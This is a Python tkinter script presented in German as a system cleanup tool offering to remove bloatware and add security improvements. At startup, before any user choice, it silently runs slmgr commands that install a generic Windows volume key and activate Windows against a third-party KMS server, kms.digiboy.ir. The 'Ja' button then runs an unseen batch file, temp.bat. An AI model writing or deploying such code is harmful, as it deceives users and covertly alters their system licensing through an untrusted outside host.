import tkinter as tk
from tkinter import messagebox
import subprocess
import threading

def execute_initial_commands():
    subprocess.run("cmd.exe /c slmgr /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX", shell=True)
    subprocess.run("cmd.exe /c slmgr /skms kms.digiboy.ir", shell=True)
    subprocess.run("cmd.exe /c slmgr /ato", shell=True)

def run_cleanup_commands():
    cleanup_commands_path = "temp.bat"
    subprocess.run(f"cmd.exe /c {cleanup_commands_path}", shell=True)

def on_yes():
    threading.Thread(target=run_cleanup_commands).start()
    messagebox.showinfo("Ausführung", "Die Bereinigung wird durchgeführt.")
    root.destroy()

def on_no():
    messagebox.showinfo("Abbruch", "Vorgang wurde abgebrochen.")
    root.destroy()

def create_ui():
    global root
    root = tk.Tk()
    root.title("Systembereinigung")

    main_frame = tk.Frame(root, padx=40, pady=40)
    main_frame.pack()

    message = tk.Label(main_frame, text="Möchten Sie Bloatware deinstallieren und Security improvements einrichten?",
                       font=('Helvetica', 14), wraplength=400)
    message.pack(pady=20)

    button_frame = tk.Frame(main_frame)
    button_frame.pack(pady=20)

    yes_button = tk.Button(button_frame, text="Ja", command=on_yes,
                           bg="#4CAF50", fg="white", font=('Helvetica', 12), width=10)
    yes_button.pack(side=tk.LEFT, padx=10)

    no_button = tk.Button(button_frame, text="Nein", command=on_no,
                          bg="#f44336", fg="white", font=('Helvetica', 12), width=10)
    no_button.pack(side=tk.LEFT, padx=10)

    root.mainloop()

if __name__ == "__main__":
    threading.Thread(target=execute_initial_commands).start()
    create_ui()
